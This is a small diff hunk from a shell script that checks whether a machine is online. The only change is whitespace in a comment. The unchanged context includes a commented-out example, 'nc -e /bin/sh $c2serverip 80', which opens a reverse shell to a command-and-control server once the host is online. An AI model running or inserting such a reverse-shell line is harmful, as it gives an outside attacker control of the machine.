@@ -21,7 +21,7 @@ then
         then
                 connection="online"
                 echo "PUT your code here"
-		#Put any code here to run once you are online.
+	    #Put any code here to run once you are online.
         # e.g.
         #nc -e /bin/sh $c2serverip 80 
         else
